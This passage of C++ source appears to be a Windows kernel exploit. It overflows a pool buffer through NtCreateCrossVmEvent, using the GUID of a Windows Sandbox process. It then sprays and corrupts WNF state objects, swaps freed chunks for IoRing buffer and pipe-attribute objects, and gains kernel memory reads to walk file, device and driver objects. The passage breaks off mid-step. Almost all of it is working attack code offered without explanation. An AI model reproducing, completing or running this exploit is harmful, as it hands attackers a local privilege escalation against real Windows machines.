    DWORD64 cur_eproc = 0;
    HANDLE hWinsbxclientproc;
    PROCESS_BASIC_INFORMATION pbi;
    long long offset = 0;
    PEB peb;
    PRTL_USER_PROCESS_PARAMETERS processParams = reinterpret_cast<PRTL_USER_PROCESS_PARAMETERS>(new char[0x1000]);
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof(si);
    si.dwFlags |= STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE; // Hide the window
    OBJECT_ATTRIBUTES oa = { 0 };
    unsigned long cnt = 0;
    SECURITY_DESCRIPTOR sd = { 0 };
    SECURITY_DESCRIPTOR sd_spraying = { 0 };
    SECURITY_DESCRIPTOR* psd;
    ULONG stamp = 0;
    WNF_STATE_CORRUPTED* regBuffersControllerWNF = NULL;
    PACL pdacl;
    ACCESS_ALLOWED_ACE* newace = reinterpret_cast<ACCESS_ALLOWED_ACE*>(VirtualAlloc(NULL, 0x10000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
    ACCESS_ALLOWED_ACE* ace;
    ACCESS_ALLOWED_ACE* other_ace;
    myNtCreateWnfStateName fNtCreateWnfStateName = (myNtCreateWnfStateName)GetProcAddress(GetModuleHandleA("NTDLL.dll"), "NtCreateWnfStateName");
    myNtDeleteWnfStateName fNtDeleteWnfStateName = (myNtDeleteWnfStateName)GetProcAddress(GetModuleHandleA("NTDLL.dll"), "NtDeleteWnfStateName");
    myNtUpdateWnfStateData fNtUpdateWnfStateData = (myNtUpdateWnfStateData)GetProcAddress(GetModuleHandleA("NTDLL.dll"), "NtUpdateWnfStateData");
    myNtDeleteWnfStateData fNtDeleteWnfStateData = (myNtDeleteWnfStateData)GetProcAddress(GetModuleHandleA("NTDLL.dll"), "NtDeleteWnfStateData");
    myNtQueryWnfStateData fNtQueryWnfStateData = (myNtQueryWnfStateData)GetProcAddress(GetModuleHandleA("NTDLL.dll"), "NtQueryWnfStateData");
    myNtFsControlFile fNtFsControlFile = (myNtFsControlFile)GetProcAddress(GetModuleHandleA("NTDLL.dll"), "NtFsControlFile");
    NtQuerySystemInformation_t NtQuerySystemInformation =
        (NtQuerySystemInformation_t)GetProcAddress(GetModuleHandleA("NTDLL.dll"), "NtQuerySystemInformation");
    NTSTATUS result = -1;
    std::vector<WNF_STATE_NAME> statenames1(STATENAMES1_SIZE);
    std::vector<WNF_STATE_NAME> statenames2(STATENAMES2_SIZE);
    std::vector<WNF_STATE_NAME> statenames3(STATENAMES3_SIZE);
    //std::vector<WNF_STATE_NAME> statenames4(0x400);
    DWORD64 curpid = 0;
    curpid = GetCurrentProcessId();
    DWORD64 pid = 0;
    DWORD64 cur_token_ptr = 0;
    std::vector<std::shared_ptr<WNF_STATE_CORRUPTED>> corrupted;
    ULONG outsize = 0x30;
    //0x50*334 = 10040
    unsigned char* buffer = new unsigned char[0x10080];
    unsigned char* backup_buffer = new unsigned char[WNF_MAX_DATA_SIZE + 0x200];
    memset(buffer, 0x0, 0x10000);

    std::cout << "Preparing..." << std::endl;

    prepare();

    ////getchar();

    //crafting objects to trigger overflow
    InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION);
    GetSecurityInfo(GetCurrentProcess(), SE_KERNEL_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, &pdacl, NULL, reinterpret_cast<PSECURITY_DESCRIPTOR*>(&psd));
    other_ace = reinterpret_cast<ACCESS_ALLOWED_ACE*>((char*)pdacl + sizeof(ACL));
    /* newace->Header.AceType = 0x0;
     newace->Header.AceSize = 0x2000;
     newace->Header.AceFlags = 0x0;
     newace->Mask = 0x001fffff;
     memcpy(newace, ace, ace->Header.AceSize);
     newace->Header.AceSize = 0x2000;*/

     /*if (!AddAce(pdacl, ACL_REVISION, 0, newace, 1)) {
         std::cout << "error adding ace" << std::endl;
     }*/
    sd.Dacl = static_cast<PACL>(VirtualAlloc(NULL, 0x10000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
    memset(sd.Dacl, 0x0, 0x10000);
    sd.Dacl->AclSize = ROUND_UP(0xfff0, 4);
    sd.Dacl->AclRevision = ACL_REVISION;
    sd.Dacl->AceCount = 1;

    ace = (ACCESS_ALLOWED_ACE*)(sizeof(ACL) + (char*)(sd.Dacl));

    memcpy(ace, other_ace, other_ace->Header.AceSize);
    //ace->Header.AceType = 0x0;
    ace->Header.AceSize = sd.Dacl->AclSize - sizeof(ACL);
    //ace->Header.AceFlags = 0x0;
    //ace->Mask = 0x001fffff;


    //setting ptr to first object of size 0x50 that can be overwritten with overflow
    unsigned char* ptr = (unsigned char*)(sd.Dacl) + 0x40;

    ULONG DataSize = 0x50 * 0x334; //to read all the tampered objects + 1 not tampered object

    //the overflow allows to overwrite the next (0xfff0-0x40)/0x50 = 0x332 objects

    int i = 0;
    while (1) {
        POOL_HEADER* ph = (POOL_HEADER*)(ptr + i * 0x50);
        if (ph < (POOL_HEADER*)(sd.Dacl) + 0x1000 - 0x10) {
            ph->BlockSize = 0x5;
            ph->PoolTag = 0x20666e57;
            ph->PoolType = 0xb & ~(1 << 3); //clear PoolQuota bit (bit index 3)
            ph->PoolIndex = 0x0;
            ph->PreviousSize = 0x0;
            ph->ProcessBilled = (PVOID)0x4242424242424242;
        }
        else {
            break;
        }
        WNF_STATE_DATA* wnf = (WNF_STATE_DATA*)(ptr + i * 0x50 + sizeof(POOL_HEADER));
        if (wnf < (WNF_STATE_DATA*)(sd.Dacl) + 0x1000 - 0x10) {
            wnf->DataSize = DataSize;
            wnf->AllocatedSize = wnf->DataSize;
            wnf->ChangeStamp = 1;
            unsigned char* data = (unsigned char*)wnf + sizeof(WNF_STATE_DATA);
            reinterpret_cast<DWORD64*>(data)[0] = i;
            DataSize -= 0x50;
        }
        else {
            break;
        }
        i++;
    }

      //set security descriptor in object attributes
    InitializeObjectAttributes(&oa, NULL, 0, NULL, &sd);
    sd.Control = 0x4;

    NtCreateCrossVmEvent fNtCreateCrossVmEvent = (NtCreateCrossVmEvent)(GetProcAddress(GetModuleHandleA("ntdll"), "NtCreateCrossVmEvent"));

    if (!fNtCreateCrossVmEvent) {
        printf("[-] GetProcAddress failed (%d)\n", GetLastError());
        return 1;
    }
    std::cout << "[*] fNtCreateCrossVmEvent = " << std::hex << fNtCreateCrossVmEvent << std::endl;
    NtQueryInformationProcess fNtQueryInformationProcess = (NtQueryInformationProcess)(GetProcAddress(GetModuleHandleA("ntdll"), "NtQueryInformationProcess"));

    if (!fNtQueryInformationProcess) {
        printf("[-] GetProcAddress failed (%d)\n", GetLastError());
        return 1;
    }

    std::cout << "[*] fNtQueryInformationProcess = " << std::hex << fNtQueryInformationProcess << std::endl;

    hWinsbxclientproc = GetWinSBXCliProcHandle();

    if (hWinsbxclientproc == NULL) {
        printf("[!] WindowsSandboxClient.exe process not found\n");
        std::cout << "[*] spawning windows sandbox" << std::endl;

        if (!CreateProcessA("C:\\Windows\\System32\\WindowsSandbox.exe", NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            std::cout << "[-] CreateProcessA failed with error: " << GetLastError() << std::endl;
            return 1;
        }
        std::cout << "[*] CreateProcessA returned successfully" << std::endl;

        while (1) {
            Sleep(5000);
            hWinsbxclientproc = GetWinSBXCliProcHandle();
            if (hWinsbxclientproc != NULL && hWinsbxclientproc != INVALID_HANDLE_VALUE) {
                break;
            }
        }
    }

    if (hWinsbxclientproc == NULL) {
        printf("[-] WindowsSandboxClient.exe process not found\n");
        return 1;
    }

    if (fNtQueryInformationProcess(hWinsbxclientproc, ProcessBasicInformation, &pbi, sizeof(pbi), &ReturnLength) > 0) {
        std::cout << "[-] NtQueryInformationProcess failed with error: " << GetLastError() << std::endl;
        return 1;
    }

    std::cout << "[*] NtQueryInformationProcess returned successfully" << std::endl;
    std::cout << "[*] peb_addr = " << std::hex << pbi.PebBaseAddress << std::endl;


    if (!ReadProcessMemory(hWinsbxclientproc, pbi.PebBaseAddress, &peb, sizeof(peb), NULL)) {
        std::cout << "[-] ReadProcessMemory failed with error: " << GetLastError() << std::endl;
        return 1;
    }
    std::cout << "[*] ReadProcessMemory returned successfully" << std::endl;
    std::cout << "[*] ProcessParameters = " << std::hex << peb.ProcessParameters << std::endl;

    if (!ReadProcessMemory(hWinsbxclientproc, peb.ProcessParameters, processParams, sizeof(RTL_USER_PROCESS_PARAMETERS), NULL)) {
        std::cout << "[-] ReadProcessMemory failed with error: " << GetLastError() << std::endl;
        return 1;
    }
    std::cout << "[*] ReadProcessMemory returned successfully" << std::endl;
    std::cout << "[*] CommandLine = " << processParams->CommandLine.Buffer << std::endl;
    std::cout << "[*] CommandLine_size = " << processParams->CommandLine.MaximumLength << std::endl;

    wchar_t* commandline = new wchar_t[processParams->CommandLine.MaximumLength + 0x2];
    ZeroMemory(commandline, processParams->CommandLine.MaximumLength + 0x2);
    if (!ReadProcessMemory(hWinsbxclientproc, processParams->CommandLine.Buffer, commandline, processParams->CommandLine.MaximumLength, NULL)) {
        std::cout << "[-] ReadProcessMemory failed with error: " << GetLastError() << std::endl;
        return 1;
    }
    std::wcout << "[*] commandline = " << commandline << std::endl;

    std::wstring commandline_wstr(commandline);
    delete[] commandline;

    //extracting guid
    std::wstring w_guid(commandline_wstr.substr(58, 36));

    std::wcout << "[*] extracted guid = " << w_guid << std::endl;

    // Calculating the length of the multibyte string
    size_t len = w_guid.length();
    char* s_guid = new char[len + 2];
    size_t returnedlength = 0;
    wcstombs_s(&returnedlength, s_guid, static_cast<size_t>(len + 2), w_guid.c_str(), len);

    std::cout << "[*] s_guid = " << s_guid << std::endl;
    HRESULT res = 0;

    wchar_t* ws = const_cast<wchar_t*>(w_guid.c_str());

    res = UuidFromStringW(reinterpret_cast<RPC_WSTR>(ws), &guid2);

    if (res != S_OK) {
        std::cout << "[-] IIDFromString failed with error: " << res << std::endl;
        return 1;
    }

    CoCreateGuid(&guid);
    //CoCreateGuid(&guid2);


    printf("Created GUID\n");

    //StringFromGUID2(guid, guidstr, 0x100);
    //StringFromGUID2(guid2, guidstr2, 0x100);

    std::cout << "extracted guid\n" << Hexdump(reinterpret_cast<unsigned char*>(&guid2), sizeof(guid2)) << std::endl << std::endl;
    std::cout << "guid\n" << Hexdump(reinterpret_cast<unsigned char*>(&guid2), sizeof(guid2)) << std::endl << std::endl;

    printf("Triggering vuln creating crossvmevent...\n");

    //////getchar();

    SetPriorityClass(GetCurrentProcess(), REALTIME_PRIORITY_CLASS);
    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);

    //start spraying
    InitializeSecurityDescriptor(&sd_spraying, SECURITY_DESCRIPTOR_REVISION);

    memset(buffer, 0x41, 0x30);
    //first spraying
    for (auto& state : statenames1) {
        //std::cout << "state before creation: " << std::hex << state.Data[0] << state.Data[1] << std::endl;

        result = fNtCreateWnfStateName(&state, WnfTemporaryStateName, WnfDataScopeMachine, FALSE, 0, WNF_MAX_DATA_SIZE, &sd_spraying);
        //std::cout << "NtCreateWnfStateName returned " << std::hex << result << std::endl;
        //std::cout << "state: " << std::hex << state.Data[0] << state.Data[1] << std::endl;

        result = fNtUpdateWnfStateData(&state, buffer, 0x30, 0, 0, 0, 0);

    }

    //second spraying
    for (auto& state : statenames2) {
        result = fNtCreateWnfStateName(&state, WnfTemporaryStateName, WnfDataScopeMachine, FALSE, 0, WNF_MAX_DATA_SIZE, &sd_spraying);
        //std::cout << "NtCreateWnfStateName returned " << std::hex << result << std::endl;
        //std::cout << "state: " << std::hex << state.Data[0] << state.Data[1] << std::endl;
        result = fNtUpdateWnfStateData(&state, buffer, 0x30, 0, 0, 0, 0);
    }

    //holes in second spraying
    for (int i = STATENAMES2_SIZE - 0x100; i > 0; i -= 100) {
        result = fNtDeleteWnfStateData(&(statenames2[i]), NULL);
        //std::cout << "NtDeleteWnfStateData returned " << std::hex << result << std::endl;
        //std::cout << "freed state " << std::hex << statenames2[i].Data[0] << statenames2[i].Data[1] << std::endl;
    }
    //triggering overflow
    fNtCreateCrossVmEvent(&hEvent, EVENT_ALL_ACCESS, &oa, 0, &guid2, &guid2);

    //third spraying
    for (auto& state : statenames3) {
        result = fNtCreateWnfStateName(&state, WnfTemporaryStateName, WnfDataScopeMachine, FALSE, 0, WNF_MAX_DATA_SIZE, &sd_spraying);
        //std::cout << "NtCreateWnfStateName returned " << std::hex << result << std::endl;
        //std::cout << "state: " << std::hex << state.Data[0] << state.Data[1] << std::endl;
        result = fNtUpdateWnfStateData(&state, buffer, 0x30, 0, 0, 0, 0);
    }

    ////getchar();

    memset(buffer, 0x0, 0x10040);
    //retrieving corrupted WNFs
    for (auto& state : statenames2) {
        stamp = 0;
        outsize = 0x30;
        result = fNtQueryWnfStateData(&state, NULL, NULL, &stamp, buffer, &outsize);
        if (result != 0) {
            //std::cout << "NtQueryWnfStateData returned " << std::hex << result << std::endl;
            //std::cout << "outsize: " << std::hex << outsize << std::endl;
            result = fNtQueryWnfStateData(&state, NULL, NULL, &stamp, buffer, &outsize);
            //std::cout << "NtQueryWnfStateData returned second time " << std::hex << result << std::endl;
            if (reinterpret_cast<DWORD64*>(buffer)[0] != 0x4141414141414141) {
                //std::cout << "found corrupted WNF: " << std::hex << state.Data[0] << state.Data[1] << "val: " << std::hex << reinterpret_cast<DWORD64*>(buffer)[0] << std::endl;
                auto p = std::make_shared<WNF_STATE_CORRUPTED>(WNF_STATE_CORRUPTED{ state, reinterpret_cast<DWORD64*>(buffer)[0],outsize });
                corrupted.emplace_back(p);
            }
        }
    }
    std::sort(corrupted.begin(), corrupted.end(), [](std::shared_ptr<WNF_STATE_CORRUPTED> a, std::shared_ptr<WNF_STATE_CORRUPTED> b) {
        return a->val < b->val;
        });
    //std::cout << "ordered corrupted WNFs" << std::endl;

    for (auto& c : corrupted) {
        //std::cout << "state: " << std::hex << c->state.Data[0] << c->state.Data[1] << "\tval: " << std::hex << c->val << "\tdataSize: " << std::hex << c->dataSize << std::endl;
    }

    auto it = std::max_element(corrupted.begin(), corrupted.end(), [](std::shared_ptr<WNF_STATE_CORRUPTED> a, std::shared_ptr<WNF_STATE_CORRUPTED> b) {
        return a->dataSize < b->dataSize;
        });

    if (it == corrupted.end()) {
        std::cout << "no corrupted WNF" << std::endl;
        exit(0);
    }

    std::cout << "max corrupted WNF" << std::endl;
    std::cout << "state: " << std::hex << it->get()->state.Data[0] << it->get()->state.Data[1] << "\tval: " << std::hex << it->get()->val << "\tdataSize: " << std::hex << it->get()->dataSize << std::endl;

    auto max_corrupted = it->get();
    auto max_corrupted_datasize = max_corrupted->dataSize;
    memset(buffer, 0x0, 0x10040);

    std::cout << "calling NtqueryWnfStateData on max_corrupted with max_corrupted->state " << std::hex << max_corrupted->state.Data[0] << max_corrupted->state.Data[0] << " and datasize" << max_corrupted->dataSize << std::endl;
    result = fNtQueryWnfStateData(&(max_corrupted->state), NULL, NULL, &stamp, buffer, &(max_corrupted->dataSize));
    if (result != 0) {
        std::cout << "NtQueryWnfStateData on max_corrupted returned " << std::hex << result << std::endl;
        exit(0);
    }
    std::cout << "buffer content" << std::endl;

    //std::cout << Hexdump(buffer, 0x150) << std::endl << std::endl;

    ////getchar();

    //setting ptr2 to beginning of next block
    auto ptr2 = buffer + 0x30;

    while (reinterpret_cast<DWORD64*>(ptr2)[0] == 0x0) {
        ptr2 += 0x8;
    }
    auto found_wnf = 0;
    while (reinterpret_cast<unsigned char*>(ptr2) < buffer + 0x10000 - 0x20) {
        ph = reinterpret_cast<POOL_HEADER*>(ptr2);
        //found WNF
        if (ph->PoolTag == 0x20666e57) {
            found_wnf = 1;
            break;
        }
        //Probably found a chunk at the end of a page. It has additional data set to 0. Skip it.
        else if (reinterpret_cast<DWORD64*>(ptr2)[0] == 0) {
            while (reinterpret_cast<DWORD64*>(ptr2)[0] == 0 && reinterpret_cast<unsigned char*>(ptr2) < buffer + 0x10000 - 0x20) {
                ptr2 += 0x8;
            }
        }
        else {
            ptr2 += 0x50;
        }
    }

    if (!found_wnf) {
        std::cout << "[-] not found WNF to be freed and replaced with RegBuffers" << std::endl;
        exit(0);
    }

    std::cout << "[+] found WNF to be freed and replaced with RegBuffers" << std::endl;

    offset = reinterpret_cast<unsigned char*>(ptr2) - buffer;

    std::cout << "offset " << std::hex << offset << std::endl;

    //I'll be able to fully control the token using the max_corrupted WNF
    if (offset + TARGET_SIZE < WNF_MAX_DATA_SIZE) {
        regBuffersControllerWNF = max_corrupted;
    }
    else {
        ph = reinterpret_cast<POOL_HEADER*>(ptr2);
        data = reinterpret_cast<DWORD64*>(ptr2 + sizeof(POOL_HEADER) + sizeof(WNF_STATE_DATA));

        auto c = std::find_if(corrupted.begin(), corrupted.end(), [&data](std::shared_ptr<WNF_STATE_CORRUPTED>& c) {
            return c->val == data[0];
            });
        if (c != corrupted.end()) {
            regBuffersControllerWNF = c->get();
        }
    }

    if (regBuffersControllerWNF == NULL) {
        std::cout << "no regBuffersControllerWNF found" << std::endl;
        exit(0);
    }


    //doing first a backup for cleanup procedure
    memcpy(backup_buffer, buffer + offset - 0x30, WNF_MAX_DATA_SIZE);

    //overwriting next WNF value to understand what is to be freed
    //when freed, It will be replaced by a RegBuffers object if the exploit has success
    ph = reinterpret_cast<POOL_HEADER*>(ptr2);
    data = reinterpret_cast<DWORD64*>(ptr2 + sizeof(POOL_HEADER) + sizeof(WNF_STATE_DATA));
    data[0] = 0x4343434343434343;


    //setting ptr3 to next WNF
    ptr3 = ptr2 + 0x30;
    while (reinterpret_cast<DWORD64*>(ptr3)[0] == 0x0) {
        ptr3 += 0x8;
    }
    found_wnf = 0;

    while (reinterpret_cast<unsigned char*>(ptr3) < ptr2 + WNF_MAX_DATA_SIZE - 0x20) {
        POOL_HEADER* ph = reinterpret_cast<POOL_HEADER*>(ptr3);
        //found WNF
        if (ph->PoolTag == 0x20666e57) {
            found_wnf = 1;
            //DWORD64* data = reinterpret_cast<DWORD64*>(ptr3 + sizeof(POOL_HEADER) + sizeof(WNF_STATE_DATA));
            break;
        }
        //Probably found a chunk at the end of a page. It has additional data set to 0. Skip it.
        else if (reinterpret_cast<DWORD64*>(ptr3)[0] == 0) {
            while (reinterpret_cast<DWORD64*>(ptr3)[0] == 0 && reinterpret_cast<unsigned char*>(ptr3) < ptr2 + WNF_MAX_DATA_SIZE - 0x20) {
                ptr3 += 0x8;
            }
        }
        else {
            ptr3 += 0x50;
        }
    }

    if (!found_wnf) {
        std::cout << "[-] not found WNF to be freed and replaced with PipeAttribute" << std::endl;
        exit(0);
    }

    std::cout << "[+] found WNF to be freed and replaced with PipeAttribute" << std::endl;

    auto offset2 = reinterpret_cast<unsigned char*>(ptr3) - buffer;

    std::cout << "offset2 " << std::hex << offset2 << std::endl;

    //overwriting next WNF value to understand what is to be freed
    //when freed, It will be replaced by a PipeAtttribute object if the exploit has success

    ph = reinterpret_cast<POOL_HEADER*>(ptr3);
    data = reinterpret_cast<DWORD64*>(ptr3 + sizeof(POOL_HEADER) + sizeof(WNF_STATE_DATA));
    data[0] = 0x4444444444444444;

    std::cout << "updating regBuffersControllerWNF" << std::endl;

    //getchar();

    /*std::cout << "offset " << std::hex << offset << std::endl;
    std::cout << "buffer content" << std::endl;*/

    //std::cout << Hexdump(buffer, 0x100) << std::endl << std::endl;

    //stamp = 1;

    //std::cout << Hexdump(buffer + offset - 0x30, 0x1000) << std::endl << std::endl;
    std::cout << "calling NtUpdateWnfStateData on tokenReaderWNF->state " << std::hex << regBuffersControllerWNF->state.Data[0] << regBuffersControllerWNF->state.Data[0] << " and datasize" << regBuffersControllerWNF->dataSize << std::endl;
    result = fNtUpdateWnfStateData(&(regBuffersControllerWNF->state), buffer + offset - 0x30, WNF_MAX_DATA_SIZE, 0, 0, 0, 0);
    if (result != 0) {
        std::cout << "fNtUpdateWnfStateData on max_corrupted returned " << std::hex << result << std::endl;
    }

    std::cout << "calling NtUpdateWnfStateData returned successfully" << std::endl;

    fNtQueryWnfStateData(&(regBuffersControllerWNF->state), NULL, NULL, &stamp, buffer, &(regBuffersControllerWNF->dataSize));

    //std::cout << Hexdump(buffer, WNF_MAX_DATA_SIZE) << std::endl << std::endl;
    //getchar();
    //retrieving corrupted WNFs
    std::cout << "[*] retrieving WNF with content 0x4343434343434343" << std::endl;
    std::cout << "[*] retrieving WNF with content 0x4444444444444444" << std::endl;

    WNF_STATE_NAME to_free_WNF = { 0 };
    WNF_STATE_NAME to_free_WNF2 = { 0 };
    BOOL found1 = FALSE, found2 = FALSE;
    //auto max_to_free_wnfs = 0;

    std::cout << "searching in statenames2" << std::endl;
    for (auto& state : statenames2) {
        //stamp = 0;
        outsize = 0x30;
        result = fNtQueryWnfStateData(&state, NULL, NULL, &stamp, buffer, &outsize);
        if (result != 0) {
            //std::cout << "NtQueryWnfStateData returned " << std::hex << result << std::endl;
            //std::cout << "outsize: " << std::hex << outsize << std::endl;
            result = fNtQueryWnfStateData(&state, NULL, NULL, &stamp, buffer, &outsize);
            //std::cout << "NtQueryWnfStateData returned second time " << std::hex << result << std::endl;
            if (reinterpret_cast<DWORD64*>(buffer)[0] == 0x4343434343434343) {
                std::cout << "found corrupted WNF: " << std::hex << state.Data[0] << state.Data[1] << "val: " << std::hex << reinterpret_cast<DWORD64*>(buffer)[0] << std::endl;
                memcpy(&to_free_WNF, &state, sizeof(WNF_STATE_NAME));
                found1 = TRUE;
            }
            else if (reinterpret_cast<DWORD64*>(buffer)[0] == 0x4444444444444444) {
                std::cout << "found corrupted WNF: " << std::hex << state.Data[0] << state.Data[1] << "val: " << std::hex << reinterpret_cast<DWORD64*>(buffer)[0] << std::endl;
                memcpy(&to_free_WNF2, &state, sizeof(WNF_STATE_NAME));
                found2 = TRUE;
            }
            if (found1 == TRUE && found2 == TRUE) {
                break;
            }
        }
    }
    std::cout << "found1 " << found1 << " found2 " << found2 << std::endl;
    if (!found1 || !found2) {
        std::cout << "searching in statenames3" << std::endl;
        for (auto& state : statenames3) {
            //stamp = 0;
            outsize = 0x30;
            result = fNtQueryWnfStateData(&state, NULL, NULL, &stamp, buffer, &outsize);
            if (result != 0) {
                //std::cout << "NtQueryWnfStateData returned " << std::hex << result << std::endl;
                //std::cout << "outsize: " << std::hex << outsize << std::endl;
                result = fNtQueryWnfStateData(&state, NULL, NULL, &stamp, buffer, &outsize);
                std::cout << "NtQueryWnfStateData returned second time " << std::hex << result << std::endl;
                if (reinterpret_cast<DWORD64*>(buffer)[0] == 0x4343434343434343) {
                    std::cout << "found corrupted WNF: " << std::hex << state.Data[0] << state.Data[1] << "val: " << std::hex << reinterpret_cast<DWORD64*>(buffer)[0] << std::endl;
                    memcpy(&to_free_WNF, &state, sizeof(WNF_STATE_NAME));
                    found1 = TRUE;
                }
                else if (reinterpret_cast<DWORD64*>(buffer)[0] == 0x4444444444444444) {
                    std::cout << "found corrupted WNF: " << std::hex << state.Data[0] << state.Data[1] << "val: " << std::hex << reinterpret_cast<DWORD64*>(buffer)[0] << std::endl;
                    memcpy(&to_free_WNF2, &state, sizeof(WNF_STATE_NAME));
                    found2 = TRUE;
                }
                if (found1 == TRUE && found2 == TRUE) {
                    break;
                }
            }
        }
    }

    std::cout << "found1 " << found1 << " found2 " << found2 << std::endl;
    if (!found1 || !found2) {
        std::cout << "searching in statenames1" << std::endl;
        for (auto& state : statenames1) {
            //stamp = 0;
            outsize = 0x30;
            result = fNtQueryWnfStateData(&state, NULL, NULL, &stamp, buffer, &outsize);
            if (result != 0) {
                //std::cout << "NtQueryWnfStateData returned " << std::hex << result << std::endl;
                //std::cout << "outsize: " << std::hex << outsize << std::endl;
                result = fNtQueryWnfStateData(&state, NULL, NULL, &stamp, buffer, &outsize);
                std::cout << "NtQueryWnfStateData returned second time " << std::hex << result << std::endl;
                if (reinterpret_cast<DWORD64*>(buffer)[0] == 0x4343434343434343) {
                    std::cout << "found corrupted WNF: " << std::hex << state.Data[0] << state.Data[1] << "val: " << std::hex << reinterpret_cast<DWORD64*>(buffer)[0] << std::endl;
                    memcpy(&to_free_WNF, &state, sizeof(WNF_STATE_NAME));
                    found1 = TRUE;
                }
                else if (reinterpret_cast<DWORD64*>(buffer)[0] == 0x4444444444444444) {
                    std::cout << "found corrupted WNF: " << std::hex << state.Data[0] << state.Data[1] << "val: " << std::hex << reinterpret_cast<DWORD64*>(buffer)[0] << std::endl;
                    memcpy(&to_free_WNF2, &state, sizeof(WNF_STATE_NAME));
                    found2 = TRUE;
                }
                if (found1 == TRUE && found2 == TRUE) {
                    break;
                }
            }
        }
    }

    std::cout << "found1 " << found1 << " found2 " << found2 << std::endl;

    if (!found1 || !found2) {
        std::cout << "[-] not found WNFs to be freed" << std::endl;
        exit(0);
    }

    result = fNtDeleteWnfStateData(&to_free_WNF, NULL);
    if (result != 0) {
        std::cout << "NtDeleteWnfStateData returned " << std::hex << result << std::endl;
    }


    //creating regBuffersArray with size 0x50 in PagedPool. Hopefully one will replace the freed WNF
    for (int i = 0; i < IORINGS_SIZE; i++) {
        UINT32 submitted = 0;
        result = SubmitIoRing(reinterpret_cast<HIORING>(iorings[i]), 0, INFINITE, &submitted);
        if (!SUCCEEDED(result)) {
            printf("[-] Failed SubmitIoRing: 0x%x\n", result);
            return FALSE;
        }
    }

    Sleep(5000);
    result = fNtDeleteWnfStateData(&to_free_WNF2, NULL);
    if (result != 0) {
        std::cout << "NtDeleteWnfStateData returned " << std::hex << result << std::endl;
    }


    //creating pipeAttributes with size 0x50 in PagedPool. Hopefully one will replace the freed WNF
    for (int i = 0; i < SPRAY_PIPE_COUNT; i++) {
        result = fNtFsControlFile(spray_pipes[i].pipe_write,
            NULL,
            NULL,
            NULL,
            &status,
            0x11003C,
            attribute,
            attribute_size,
            output,
            output_size
        );
        if (result != 0) {
            std::cout << "[-] fNtFsControlFile failed with error 0x" << std::hex << result << std::endl;
        }
    }


    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_NORMAL);
    SetPriorityClass(GetCurrentProcess(), NORMAL_PRIORITY_CLASS);

    //std::cout << "reading RegBuffersArray and pipe attribute" << std::endl;

    //getchar();
    //stamp = 0;
    result = fNtQueryWnfStateData(&(regBuffersControllerWNF->state), NULL, NULL, &stamp, buffer, &(regBuffersControllerWNF->dataSize));
    if (result != 0) {
        std::cout << "NtQueryWnfStateData on regBuffersControllerWNF returned " << std::hex << result << std::endl;
        exit(0);
    }
    //std::cout << "buffer content" << std::endl;

    std::cout << Hexdump(buffer, 0x150) << std::endl << std::endl;

    //getchar();

    found1 = 0, found2 = 0;
    ptr2 = buffer;
    auto regbuffersobject_ptr = ptr2;
    auto pipeattributeobject_ptr = ptr2;

    while (ptr2 < buffer + regBuffersControllerWNF->dataSize - sizeof(POOL_HEADER)) {
        ph = reinterpret_cast<POOL_HEADER*>(ptr2);
        if (ph->PoolTag == REGBUFFERS_TAG) {
            found1 = 1;
            regbuffersobject_ptr = ptr2;
        }
        else if (ph->PoolTag == PIPEATTRIBUTE_TAG) {
            found2 = 1;
            pipeattributeobject_ptr = ptr2;
        }
        if (found1 && found2) {
            break;
        }
        ptr2 += 0x8;
    }

    if (found1 == FALSE) {
        std::cout << "[-] regBuffers not found" << std::endl;
        exit(0);
    }

    if (found2 == FALSE) {
        std::cout << "[-] pipeAttributes not found" << std::endl;
        exit(0);
    }

    std::cout << "[+] regBuffers found and can be overwritten" << std::endl;
    std::cout << "[+] pipeAttribute found and can be read" << std::endl;

    //getting original kernel address of IOP_MC_BUFFER_ENTRY struct and saving in original_regBufferEntry
    auto original_regBufferEntry = *(reinterpret_cast<DWORD64*>(regbuffersobject_ptr + sizeof(_POOL_HEADER)));
    //getting address of PipeAttribute.ListEntry.Flink
    auto pipeAttributeFlink = *(reinterpret_cast<DWORD64*>(pipeattributeobject_ptr + sizeof(_POOL_HEADER)));

    auto fileObject_ptr = pipeAttributeFlink - ROOT_PIPE_ATTRIBUTE_OFFSET + FILE_OBJECT_OFFSET;
    std::cout << "[*] original_regBufferEntry: " << std::hex << original_regBufferEntry << std::endl;
    std::cout << "[*] pipeAttributeFlink: " << std::hex << pipeAttributeFlink << std::endl;

    IOP_MC_BUFFER_ENTRY** regBuffersAddr = reinterpret_cast<PIOP_MC_BUFFER_ENTRY*>(regbuffersobject_ptr + sizeof(POOL_HEADER));

    regBuffersAddr[0] = fake_bufferentry;

    result = fNtUpdateWnfStateData(&(regBuffersControllerWNF->state), buffer, WNF_MAX_DATA_SIZE, 0, 0, 0, 0);
    if (result != 0) {
        std::cout << "fNtUpdateWnfStateData on tokenControllerWNF returned " << std::hex << result << std::endl;
    }

    //std::cout << "calling NtUpdateWnfStateData returned successfully" << std::endl;

    //getchar();

    auto test_targetAddress = VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    VirtualLock(test_targetAddress, 0x1000);
    memset(test_targetAddress, 0x80, 0x1000);

    for (int i = 0; i < IORINGS_SIZE; i++) {
        targetHandle = reinterpret_cast<HIORING>(iorings[i]);
        KRead((PVOID)fileObject_ptr, reinterpret_cast<PBYTE>(&fileObject), sizeof(fileObject));
        if (fileObject != 0x4141414141414141) {
            std::cout << "[+] found target handle" << std::endl;
            std::cout << "[*] targetHandle: " << std::hex << targetHandle << std::endl;
            std::cout << "[*] ioring index: " << std::dec << i << std::endl;
            std::cout << "[*] fileObject: " << std::hex << fileObject << std::endl;
            break;
        }
    }

    //get deviceObject
    KRead((PVOID)(fileObject + 0x8), reinterpret_cast<PBYTE>(&deviceObject), sizeof(deviceObject));
    //std::cout << "[*] deviceObject: " << std::hex << deviceObject << std::endl;

    //get driverObject
